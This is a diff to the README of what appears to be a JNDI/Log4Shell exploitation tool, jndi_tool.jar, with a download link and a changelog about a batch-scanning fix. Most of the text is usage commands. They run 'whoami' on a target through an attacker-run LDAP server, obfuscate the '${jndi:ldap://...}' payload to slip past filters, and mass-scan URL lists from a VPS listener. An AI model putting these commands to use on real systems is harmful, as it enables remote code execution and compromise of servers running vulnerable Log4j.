@@ -5,6 +5,9 @@
 
 download_url : https://toolaffix.oss-cn-beijing.aliyuncs.com/jndi_tool.jar
 
+# 2022-01-07 修复了log4j批量检测的一个BUG以及做了优化，结果会保存到 log4j_result.txt
+
+
 > java -jar jndi_tool.jar 
 Usage:
 jndi:
@@ -25,10 +28,10 @@ log4j:
 java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target  w=tomcat/groory/http  default:http
 java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
 java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
-java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.txt
+java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.txt 
 
 
-# 2021-12-27 新增log4j批量检测
+
 
 > java -cp jndi_tool.jar jndi.log4j.Log4j vps_ip 8099 url=http://xx.xx.xx
 [-] LDAP Listening on 0.0.0.0:80
